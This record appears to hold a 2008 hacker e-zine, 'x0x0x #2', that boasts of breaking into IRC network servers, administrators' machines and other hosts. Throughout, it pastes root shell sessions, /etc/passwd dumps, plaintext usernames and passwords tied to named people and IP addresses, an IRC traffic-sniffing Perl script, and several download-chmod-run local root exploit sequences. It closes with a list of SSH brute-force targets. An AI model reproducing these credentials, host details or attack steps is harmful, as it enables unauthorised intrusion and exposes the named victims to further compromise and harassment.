_type,title,platform,link,published,cve,desc
Papers,x0x0x #2,eZine,,2008-03-01,: N/A,"#!/local/efnet/el8/efnet/corporation
################################################
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
################################################
#                                              #
#                                              #
#            ÛÛÛÛ             ÛÛÛÛ             #
#           ÛÛ± ÛÛ           ÛÛ± ÛÛ²           #
#  ÛÛÛ  ÛÛ ±ÛÛ  ±Û° °ÛÛ  ÛÛ  ÛÛ  ±ÛÛ °ÛÛ  ÛÛ°  #
#   ÛÛ²ÛÛ  ²ÛÛ  °Û²  °Û²ÛÛ   ÛÛ  °ÛÛ  °Û²ÛÛ°   #
#    ÛÛÛ   ²ÛÛ  °Û±   ÛÛÛ    ÛÛ  °ÛÛ   ÛÛÛ     #
#   °ÛÛÛ±  ±ÛÛ  ±Û°   ÛÛÛ±   ÛÛ  ±ÛÛ   ÛÛÛ±    #
#   ÛÛ°ÛÛ   ÛÛ± ÛÛ   ²Û°ÛÛ   ÛÛ± ÛÛÛ  ²Û°ÛÛ²   #
#  ÛÛ²  ÛÛ   ÛÛÛÛ   ²Û²  ÛÛ   ÛÛÛÛ   ²Û²  ÛÛ²  #
#                                              #
################################################
#                                              #
#              .: second zine :.               #
#                                              #
#        [  tribute to efnet el8 corp  ]       #
#                                              #
#                                              #
#   date:    december 2007                     #
#   update:  march 2008                        #
#                                              #
#                                              #
#<><><><><><><><><><><><><><><><><><><><><><><>#
#                                              #
#   -= always keeping the secret identify =-   #
#                                              #
#<><><><><><><><><><><><><><><><><><><><><><><>#

  .''.
 (~~~~)
   ||
 __||__
/______\
  |  |' _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
  |  |'|o| - - - - - - - - - - - - - - - - - - - - - - - - -||
  |  |'| |                                                  ||
  |  |'| |                      . ' .                       ||
  |  |'| |                  . '       ' .                   ||
  |  |'| |              . '    .-'""'-.    ' .               ||
  |  |'| |          . '      ,""       "".      ' .           ||
  |r |'| |      . '        /:   x0x0x   :\        ' .       ||
  |s |'| |  . '            ;  . x0x0x    ;            ' .   ||
  |t |'| |    ' .          \: ..x0x0x   :/          . '     ||
  |  |'| |        ' .        `. . .    ,/       . '         ||
  |  |'| |            ' .      `-.,,.-'     . '             ||
  |  |'| |                ' .           . '                 ||
  |  |'| |                    ' .   . '                     ||
  |  |'| |                        '                         ||
  |  |'|o|-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_||
  |  |'
  |  |'
  |  |'  united by brazil  - 100% BRAZUKAAAAAAAAAAAA
  |  |'
  '~~'



\\                                                                                 //
  A long time ago, most part of 'leet' user of efnet network didnt like brazilians,  
  saying they are 'packet kiddies', 'lammers'. these 'leet' users start to believe 
  about it, but they think all  .br guys was that! So we have the idea of laugh of 
  these  'leet boys'  and start  to publish to everbody see what really happens on 
  efnet! hehehe
  Some passwords we´ll not publish, only to avoid surprises in our access!
  They are smart! but! we´re looking at them!
//                                                                                 \\



*/

  TARGETS : SHELL ACCOUNTS && EFNUT HUXORS && IRCOPS && EFNET SERVERS

 /*




STEVOO w45 h4ck3d... oMG iRcop Admin HackEd ??? Yeah.. She/HE Is!!

Stevoo / Stefan !! PoOoooooooooooooWWwwww !!! Results: http://img149.imageshack.us/img149/356/stevootn3.jpg


login as: root
root@83.140.180.6's password:
Last login: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

[root@quagga ~]# uname -a;ifconfig;cat /etc/passwd|grep bash

Linux quagga.webguidepartner.com 2.6.18-4-686 #1 SMP Mon Mar 26 17:17:36 UTC 2007 i686 GNU/Linux



#0h 5ur3 n0w w3 4r3 47 stevoo m41n 53rv3r!! okk stevooooooooo =****!!! n0w w3 wi11 5n1ff u!



[root@quagga ~]# cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
zabbix:x:1001:1001:,,,:/home/zabbix:/bin/bash
stevoo:x:1002:1002:Stefan Larsson,,,:/home/stevoo:/bin/bash
lunkan:x:1000:1000:,,,:/home/lunkan:/bin/bash
ftp:x:112:65534::/home/ftp:/bin/bash
moffe:x:1003:1003:,,,:/home/moffe:/bin/bash
j-dog:x:1004:1004:,,,:/home/j-dog:/bin/bash
mac:x:1005:1005:,,,:/home/mac:/bin/bash
irc:x:1006:1006:,,,:/home/irc:/bin/bash
ustas:x:1007:1007:,,,:/home/ustas:/bin/bash
dubkat:x:1008:1008:,,,:/home/dubkat:/bin/bash
sonny:x:1009:1009:,,,:/home/sonny:/bin/bash
flyguy:x:1010:1010:,,,:/home/flyguy:/bin/bash



^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^~~~~~~~~~~~~~~~~FINDING NEMOOOOOOOOOOO~~~~~~~~~~~~~~^
^^^^^^^^^^^^^^^^^^^^   ^^^^^   ^^^   ^^^^^^^^^^  ^^^^^

                                     _
                                    (_)
              |    .
          .   |L  /|   .          _
      _ . |\ _| \--+._/| .       (_)
     / ||\| Y J  )   / |/| ./
    J  |)'( |        ` F`.'/        _
  -<|  F         __     .-<        (_)
    | /       .-'. `.  /-. L___       
    J \      <    \  | | O\|.-'  _   
  _J \  .-    \/ O | | \  |F    (_) 
 '-F  -<_.     \   .-'  `-' L__    
__J  _   _.     >-'  )._.   |-'  
`-|.'   /_.           \_|   F    
  /.-   .                _.<     
 /'    /.'             .'  `\    
  /L  /'   |/      _.-'-\
 /'J       ___.---'\|
   |\  .--' V  | `. `
   |/`. `-.     `._)
      / .-.\
VK    \ (  `\
       `.\


[root@quagga ~]# cd /l4m3d1r/; cat p455w0rdz.txt


WIKI
----------------
user = putumayo
pass = utE09X2

FINALTEST
-----------------
user = finaltest
pass = FINAL06tst

POKERLISTINGS.COM
--------------------------------
user = turbonegro
pass = eFb9KLm

POKER USER
--------------------
user = poker
pass = kLmn09Q3

ROOT
----
user = root
pass = 5aB197cQ
NEW = UZk9Taj23
-----------------




THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX
>>>>>>>>>>> AS YOU CAN SEE STEVOO IS A GOOD ADMIN! SAVING PASSWORDZ IN YOUR HOME FILEZZZZZZ <<<<<<<<<<<<
THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX THKX




#dubkat 4nd sonny!!! g00d 74rg3755!!!!!!


#0kkk!! ch3ck1ng 1p5!!!!!!!!!!



[root@quagga ~]# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:13:72:7B:7B:C9
          inet addr:83.140.180.6   Bcast:83.140.180.255  Mask:255.255.255.0
          inet6 addr: fe80::213:72ff:fe7b:7bc9/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:383711035 errors:0 dropped:0 overruns:0 frame:0
          TX packets:476418783 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:3959576563 (3.6 GiB)  TX bytes:1066088994 (1016.7 MiB)
          Interrupt:169

eth0:0    Link encap:Ethernet  HWaddr 00:13:72:7B:7B:C9
          inet addr:83.140.180.2  Bcast:83.140.180.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:169

eth0:1    Link encap:Ethernet  HWaddr 00:13:72:7B:7B:C9
          inet addr:83.140.180.151  Bcast:83.140.180.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1



................................
................................
......................
....................     hmmmmmmmmmmmmm 7h3 1p 15 u53d t0 c0nn3c7 70 efnet.port80.se!! l375 ch3ck ?!?
....................



## Just ip(83.140.180.2 ) can access port80.se, okay honey!! do that!


[root@quagga ~]# ssh -l root -b 83.140.180.2 efnet.port80.se
root@83.140.180.6's password:
Last login: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

[root@efnet ~]# uname -a

FreeBSD efnet.port80.se 6.2-RELEASE-p8 FreeBSD 6.2-RELEASE-p8 #0: Sat Nov  3 01:23:30 CET 2007     root@efnet.port80.se:/usr/obj/usr/src/sys/EFNET  i386 



#0hhhhhhhh g0dddddddddddddd!!! port80.se 0wn333333ddddddddddddd!!!! l000000000lllllllll!!!!! l375 ch3ck m4ch1n3



   ***********************************************
  //////////    ///////////\\\\\\\\\\    \\\\\\\\\\
 //////////    !!!ILEGAL TOOL FOUND!!!    \\\\\\\\\\
//////////    ////////////  \\\\\\\\\\\    \\\\\\\\\\
+++++++++++++++++++++++++++++++++++++++++++++++++++++


[root@efnet xxxxx]# cat ircsniff.pl

#!/usr/bin/perl

if(@ARGV == 0) {
  print ""Args: $ARGV[0] [port]\n"";
  exit(0);
}

if(@ARGV == 1) {
  $port = $ARGV[0];
  open(FH, ""tshark -tad -lnx -d tcp.port==$port,irc -R 'irc' |"") or die ""Unable to open wireshark."";
}
my $packet = """";

while(<FH>) {
  chomp($_);
  chomp($_);

  if($packet && /^$/) {
    for(split /\r\n/, $packet) {
      if(/(:[^ ]+ PRIVMSG .*)$/i) {
        print ""<- $1\n"";
      } elsif(/(PRIVMSG .*)$/i) {
        print ""-> $1\n"";
      }
    }
    $packet = """";
  }

  if(/^[\da-f]{4}  (([\da-f]{2} ?)+)   /) {
    my $a = $1;
    $a =~ s/([\da-f]{2})\s?/chr(hex($1))/eg;
    $packet .= $a;
  }
}
close(FH);





%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%
%%%%
%%         later thay say that ircops dont sniffz this server on efnet! there this the test!
%

%


%




Lets Joke:

[root@quagga ~]# wget www.site.com/bnc.perl;perl bnc.perl 8000 st3v0

on irc: 

/server 83.140.180.6:8000

* Connecting to 83.140.180.6 (8000)
-216.47.178.108- *** [BNC 1.8-teste9 por 0ldW0lf - Atrix Team]
-216.47.178.108- *** Digite /QUOTE PASS <senha>
-216.47.178.108- *** Senha aceita. Bem vindo, administrador!
-216.47.178.108- *** Digite /QUOTE CONN <servidor[:porta]> [opções]
-216.47.178.108- *** Para lista os comandos da BNC digite /QUOTE BHELP
-BNC- [Admin LOG]: Usuário administrador logou

/quote conn efnet.port80.se:6667
/server efnet.port80.se
/nick stevoo_gay

#get oper
/oper ***** *****


#COOL stevoo@83.140.180.6 gets spoofed host!! 


/msg #x0x0x h3110 w0r1d!


x0x0x_0wn is stevoo@127.0.0.1 * Stefan Larsson [STLA-RIPE]
x0x0x_0wn using efnet.port80.se We eat more pussy!
x0x0x_0wn is a beaver gourmet (Server Administrator)
x0x0x_0wn has been idle 5secs, signed on Mon Nov 05 16:36:48
x0x0x_0wn End of /WHOIS list.




ll0000000000llllllllllllllllllllll!! stevoo u are the magic!!!!




&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&

7w0 y34r5 5n1ff1ng ur h0m3 b0x stevoo , 7h3n w3 g37 s0m3 4cc355 , my fr13nd
1337´5 533 7h3n ?
x0x0x h4v3 100% 4cc355 1n ur 0wn n37w0rk, 4nd 07h3r5



    ,` `/` `. ,\  
  /` ` ' /, ' ,` \   
   ` / ` ` ' ,.,`,   
 /-/- ``/=   = \ ,`  
  ''  '  @'  @' ) \  
 //|'/ )   |\  |\`    
 cf   (   ,,',, )   
       \__ -- _/    
          `--'       ""STEVOO is synonymous of SUPERMAN!"" Albert Einstein




       **************************  tevoo
    .*##*:*####***:::**###*:######*.  tevoo
   *##: .###*            *######:,##*  tevoo
 *##:  :####:             *####*.  :##:  tevoo
  *##,:########**********:,       :##:  tevoo
   .#########################*,  *#*  tevoo
     *#########################*##:  tevoo
       *##,        ..,,::**#####:  tevoo
        ,##*,*****,        *##*  tevoo
          *#########*########:  tevoo
            *##*:*******###*  tevoo
             .##*.    ,##*  tevoo
               :##*  *##,  tevoo
                 *####:  tevoo
                   :,  tevoo


&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&
&&&&
&&
&


#Spain Host


[root@x0x0x ~]# ssh 91.142.209.1
root@91.142.209.1's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux es.int.webguidepartner.com 2.6.9-34.0.1.ELsmp #1 SMP Wed May 24 08:14:29 CDT 2006 i686 i686 i386 GNU/Linux
bash# exit



#Australian Host


[root@x0x0x ~]# ssh 202.125.41.133 -l sonny.sarai
sonny.sarai@202.125.41.133's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ su root
Password: xxxxxx

bash# uname -a
Linux au.int.webguidepartner.com 2.6.9-34.EL #1 Wed Mar 8 00:07:35 CST 2006 i686 athlon i386 GNU/Linux
bash# exit


#Flexservers is a box very important with importants files that i WONT publish !! lol :


[root@x0x0x ~]# ssh 213.239.174.129 
root@213.239.174.129 's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux flexserver.flexservers.com 2.6.22.9 #2 SMP Fri Oct 5 17:52:23 CEST 2007 i686 i686 i386 GNU/Linux
bash# exit


#German Host


[root@x0x0x ~]# ssh 80.86.82.231 -l sonny.sarai
sonny.sarai@80.86.82.231's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ su root
Password: xxxxxx

bash# uname -a
Linux de 2.6.16.1-amd-webperoni-06042006-1 #1 Thu Apr 6 17:01:51 CEST 2006 i686 athlon i386 GNU/Linux
bash# exit




#Idiot box good bandwith ## used to host my worm some days lol



[root@x0x0x ~]# ssh 205.234.178.244
root@205.234.178.244's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux lb1 2.6.15-2-amd64 #1 SMP Tue Aug 28 17:53:01 BST 2007 x86_64 GNU/Linux
bash# exit



#Suomi Host



[root@x0x0x ~]# ssh 217.30.189.33 
root@217.30.189.33's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux fi.int.webguidepartner.com 2.6.9-34.0.1.ELsmp #1 SMP Wed May 24 08:14:29 CDT 2006 i686 i686 i386 GNU/Linux
bash# exit




#Netherlands Host



[root@x0x0x ~]# ssh 81.171.121.170 
root@81.171.121.170's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux nl.int.webguidepartner.com 2.6.9-34.0.1.ELsmp #1 SMP Wed May 24 08:14:29 CDT 2006 i686 athlon i386 GNU/Linux (dedicated.by.twilightinc.nl)
bash# exit




#Netherlands Host



[root@x0x0x ~]# ssh 217.30.189.33 
root@217.30.189.33's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux nl.int.webguidepartner.com 2.6.9-34.0.1.ELsmp #1 SMP Wed May 24 08:14:29 CDT 2006 i686 athlon i386 GNU/Linux (dedicated.by.twilightinc.nl)
bash# exit




#Canada Host



[root@x0x0x ~]# ssh 204.15.197.130 
root@204.15.197.130's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux gw.ca.webguidepartner.com 2.6.9-42.0.3.ELsmp #1 SMP Fri Oct 6 06:21:39 CDT 2006 i686 i686 i386 GNU/Linux
bash# /lib/ldd 2242

83.140.43.249 (per:5!vcAP8!)
83.140.43.49 (stefan:n1nj4h1978) *old pass of stevoo i wont said new pass!*

bash# exit




#Malasya Host



[root@x0x0x ~]# ssh 124.217.250.115 
root@124.217.250.115's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux my.int.webguidepartner.com 2.6.9-42.0.10.ELsmp #1 SMP Tue Feb 27 10:11:19 EST 2007 i686 i686 i386 GNU/Linux
bash# exit




#Spain Host



[root@x0x0x ~]# ssh 75.126.49.137 
root@75.126.49.137's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux es.int.webguidepartner.com 2.6.9-42.0.3.ELsmp #1 SMP Mon Sep 25 17:28:02 EDT 2006 i686 i686 i386 GNU/Linux
bash# exit




#Usa gayl0rd Host



[root@x0x0x ~]# ssh 69.20.4.41
root@69.20.4.41's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux us.int.webguidepartner.com 2.6.9-42.0.2.EL #1 Thu Aug 17 17:36:53 EDT 2006 i686 athlon i386 GNU/Linux
bash# exit




#Malasya Host


of some boxes i will show some login:password to show that´s not fake! : (per:5!vcAP8!) (sonny.sarai:comp1409sonny) (stefan:n1nj4h1978) (root:JAk9Taj23) (h00h0h0)


[root@x0x0x ~]# ssh 74.53.191.130 
root@74.53.191.130's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux webhostingsearch.com.theplanet.host 2.6.18-8.1.8.el5 #1 SMP Mon Jun 25 17:06:19 EDT 2007 i686 i686 i386 GNU/Linux (82.bf.354a.static.theplanet.com)
bash# exit


//idiots using same root password and personal logins in all boxes!! that´s love!

#Dev dataBase Host




[root@x0x0x ~]# ssh 83.140.180.235 -l anna
root@83.140.180.235's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ su root
Password: xxxxxx

bash# uname -a
Linux devbase 2.6.18-53.1.4.el5PAE #1 SMP Fri Nov 30 01:21:20 EST 2007 i686 i686 i386 GNU/Linux

bash# ssh acad23@204.200.222.171
root@83.140.180.235's password: Eb11Be22
[acad23@academicinfo.net ~]$ exit;

bash# exit



*&#¨*&$#@¨*&($#@¨*&$(¨#@&($*¨#$@&*($¨#(@*&#$¨($@¨#&(
#$¨*&$¨@*&($#@*(¨($#@¨(@#$¨*&(#$@¨&($@#¨*&(

#HAHHAHAHA ""FULL HACK""0rz owned!! good hax0rs!!

#$¨*&$¨@*&($#@*(¨($#@¨(@#$¨*&(#$@¨&($@#¨*&(
*&#¨*&$#@¨*&($#@¨*&$(¨#@&($*¨#$@&*($¨#(@*&#$¨($@¨#&(





[root@x0x0x ~]# ssh 83.140.33.134 -l stevoo
stevoo@83.140.33.134 's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ su root
Password: xxxxxx

bash# uname -a
Linux spark.bgpmonkey.net 2.6.20-1.2320.fc5 #1 Tue Jun 12 18:50:38 EDT 2007 i686 i686 i386 GNU/Linux

bash# ssh acad23@204.200.222.171 (acad23:Eb11Be22)

[acad23@academicinfo.net ~]$ exit;

bash# exit




****************************
############################
**#
**#  want get ircop? 
*#
#  try on fulhack irc: /oper stevoo bajs
#







#Other shit



[root@x0x0x ~]# ssh 83.140.2.18 -l per
per@83.140.2.18's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ su root
Password: xxxxxx

bash# uname -a
Linux rock-dk 2.6.18-8.el5 #1 SMP Thu Mar 15 19:57:35 EDT 2007 i686 i686 i386 GNU/Linux
bash# exit







#Other shit 2!! 



[root@x0x0x ~]# ssh 82.103.140.20 -l Customer
Customer@82.103.140.20's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ su root
Password: xxxxxx

bash# uname -a
Linux e82-103-140-20s.easyspeedy.dk 2.6.18-53.el5PAE #1 SMP Mon Nov 12 02:55:09 EST 2007 i686 athlon i386 GNU/Linux
bash# exit





#Other shit 3!! 



[root@x0x0x ~]# ssh 82.140.8.18
root@82.140.8.18's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux mx.rockintention.com 2.6.18-8.1.8.el5 #1 SMP Tue Jul 10 06:50:22 EDT 2007 i686 i686 i386 GNU/Linux
bash# exit





#Other shit 4!! 



[root@x0x0x ~]# ssh 83.140.180.63  (rootpass = mortgage4711)
root@83.140.180.63's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux harry.webguidepartner.com 2.6.18-53.1.13.el5 #1 SMP Tue Feb 12 13:01:45 EST 2008 i686 athlon i386 GNU/Linux
bash# exit






#Other shit 5!! 



[root@x0x0x ~]# ssh 82.96.22.90
root@82.96.22.90's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux se.int.webguidepartner.com 2.6.9-34.0.1.ELsmp #1 SMP Wed May 24 08:14:29 CDT 2006 i686 athlon i386 GNU/Linux
bash# exit






#Other shit 6!! 



[root@x0x0x ~]# ssh 82.103.140.117
root@82.103.140.117's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux rake 2.6.18-8.1.10.el5 #1 SMP Thu Sep 13 12:17:54 EDT 2007 i686 athlon i386 GNU/Linux
bash# exit






#Other shit 7!! 



[root@x0x0x ~]# ssh 83.140.180.3
root@83.140.180.3's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux failover.webguidepartner.com 2.6.9-34.0.2.ELsmp #1 SMP Fri Jul 7 19:52:49 CDT 2006 i686 i686 i386 GNU/Linux
bash# exit






#Other shit 8!! 



[root@x0x0x ~]# ssh 83.140.43.100
root@83.140.43.100's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux db.sweden.webguidepartner.com 2.6.9-42.0.2.ELsmp #1 SMP Wed Aug 23 00:17:26 CDT 2006 i686 i686 i386 GNU/Linux
bash# exit






#Other shit 9!! 



[root@x0x0x ~]# ssh 83.140.43.100
root@83.140.43.100's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux db.sweden.webguidepartner.com 2.6.9-42.0.2.ELsmp #1 SMP Wed Aug 23 00:17:26 CDT 2006 i686 i686 i386 GNU/Linux
bash# exit






#Other shit 10!! 



[root@x0x0x ~]# ssh 83.140.43.71
root@83.140.43.71's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux skalman 2.6.18-8.el5xen #1 SMP Fri Jan 26 14:42:21 EST 2007 i686 i686 i386 GNU/Linux
bash# exit






#Other shit 10!! 



[root@x0x0x ~]# ssh 83.140.43.26
root@83.140.43.26's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux db.sweden.webguidepartner.com 2.6.9-42.0.2.ELsmp #1 SMP Wed Aug 23 00:17:26 CDT 2006 i686 i686 i386 GNU/Linux
bash# exit






#Other shit 11!! 



[root@x0x0x ~]# ssh 67.192.39.119
root@83.140.43.26's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash# uname -a
Linux 133972-dev.mortgageloan.com 2.6.18-8.1.8.el5 #1 SMP Mon Jun 25 17:06:19 EDT 2007 i686 athlon i386 GNU/Linux
bash# exit



OK! Fuck uname´s !! lets go to something more interesting!



[root@x0x0x ~]# ssh 216.240.158.191 -l lcars
lcars@216.240.158.191's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx


bash$ wget xpl_local_root_leet.bin; chmod a+x xpl_local_root_leet.bin; ./xpl_local_root_leet.bin

bash# rm -rf xpl_local_root_leet.bin;

bash# uname -a
Linux kingdom.scns.com 2.6.23.14-64.fc7 #1 SMP Sun Jan 20 23:54:08 EST 2008 i686 i686 i386 GNU/Linux
bash# exit







.............................................

             ,-. 
    ,     ,-. s ,-. 
   / \   ( r )-( t ) 
   \ |  ,.>-(   )-< 
    \|,' (   )-(   ) 
     Y ___`-'   `-' 
     |/__/   `-' 
     | 
     | 
     |    -dubkat my flower-
  ___|_____________ 

;................



OkAy my Friend DuBKat ... i know that u are good person... but i need show u something! lol



[root@x0x0x ~]# ssh 72.37.235.2 -l dubkat
dubkat@72.37.235.2's password: sjpd3139

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx


bash$ wget shmat2; chmod a+x shmat2; ./shmat2
..................................................................
..................................................................
..................................................................
..................................................................
..................................................................
..................................................................
..................................................................
...........................................p00f!

NIX@# id

uid=0(root) gid=0(root) 

bash# rm -rf shmat2;

bash# uname -a
FreeBSD riley.rsc.cx 6.2-RELEASE-p5 FreeBSD 6.2-RELEASE-p5 #3: Thu May 24 10:08:07 PDT 2007     sg@riley.rsc.cx:/usr/obj/usr/src/sys/RILEY  i386
bash# exit





.............................................
;................QUAKENET HUB



#Thkxxxxxxx g0d




[root@x0x0x ~]# ssh 64.237.63.164 -l sl
sl@64.237.63.164's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx


bash$ wget shmat2; chmod a+x shmat2; ./shmat2
..................................................................
..................................................................
..................................................................
..................................................................
..................................................................
..................................................................
..................................................................
...........................................p00f!

NIX@# id

uid=0(root) gid=0(root) 

bash# rm -rf shmat2;

bash# uname -a
FreeBSD hub.us.quakenet.org 6.2-RELEASE-p4 FreeBSD 6.2-RELEASE-p4 #0: Tue May 22 13:08:26 EDT 2007     root@qhub.gameservers.com:/usr/obj/usr/src/sys/QUAKENET  i386

bash# netstat -na|grep .6667|wc -l
1544

# lets drop 6667 ? l0lll

bash# exit

Others boxes... that we get on sniff

´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´
´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´
´´´´´   FreeBSD fw.webguidepartner.com 6.1-RELEASE-p10 FreeBSD 6.1-RELEASE-p10 #0: Fri Oct 13 03:04:33 UTC 2006     sullrich@builder.livebsd.com:/usr/obj.pfSense/usr/src/sys/pfSense.6  i386
´´´´´   Linux rock-dk 2.6.18-8.el5 #1 SMP Thu Mar 15 19:57:35 EDT 2007 i686 i686 i386 GNU/Linux
´´´´´   Linux lurvas 2.6.9-34.0.2.ELsmp #1 SMP Fri Jul 7 19:52:49 CDT 2006 i686 i686 i386 GNU/Linux (lurvas.webguidepartner.com)






OLD......


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                       )/_            
             _.--..---""-,--c_         
        \L..'           ._O__)_       
,-.     _.+  _  \..--( /           
  `\.-''__.-' \ (     \_              
    `'''       `\__   /\              
                ')                   



                                          MONSTERSHELLSSSSSSS (its gone... :(!)

                                       ~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


[root@x0x0x ~]# ssh phisher1@fire.monstershells.com

phisher1@fire.monstershells.com's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx


bash$ sudo su -
Password:
bash# id
uid=0(root) gid=0(root) groups=0(root)
bash# uname -a
FreeBSD fire.monstershells.com 6.3-RELEASE-p1 FreeBSD 6.3-RELEASE-p1 #0: Fri Feb 15 01:47:13 UTC 2008     root@box.domain.com:/usr/obj/usr/src/sys/fire  i386


****** OH THKS IDIOT ********


some logins there


||;;
|| 
|| login in: john:v1p3r007
|| login in: icon:anthony1
|| login in: hack:seven7
|| login in: kuwait:ln7EZB3LBd
|| login in: absolutely:viper007
|| login in: shield:H4ilhitler!
|| login in: john:v1p3r007
||;; 



PHISHER YOU ARE My POPSTAR!!!


ssh phisher1@home.phisher1.com (98.200.198.242)
phisher1@home.phisher1.com's password: xxxxxxxxxx

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx


bash$ sudo su -
Password:
bash# id
uid=0(root) gid=0(root) groups=0(root)
bash# uname -a
Linux kubuntu 2.6.22-14-generic #1 SMP Tue Feb 12 07:42:25 UTC 2008 i686 GNU/Linux
bash# 



&&& THKS FOR GIVE UR BOX TO US USE TO CHECK SOME BRUTEFORCE LIST.. THE SAME THAT WE FOUND ON MONSTERSHELLS LOL &&&


bash# cd /dev/.tty64; cat list


ssh oracle@12.0.42.6
ssh oracle@128.59.59.62
ssh oracle@129.173.66.56
ssh oracle@91.103.96.18
ssh oracle@84.242.3.6
ssh oracle@83.17.87.138
ssh oracle@83.149.192.29
ssh oracle@82.94.199.146
ssh oracle@82.91.199.194
ssh oracle@82.147.71.143
ssh oracle@83.149.192.29
ssh oracle@82.147.71.143
ssh oracle@82.147.130.245
ssh oracle@82.114.101.66
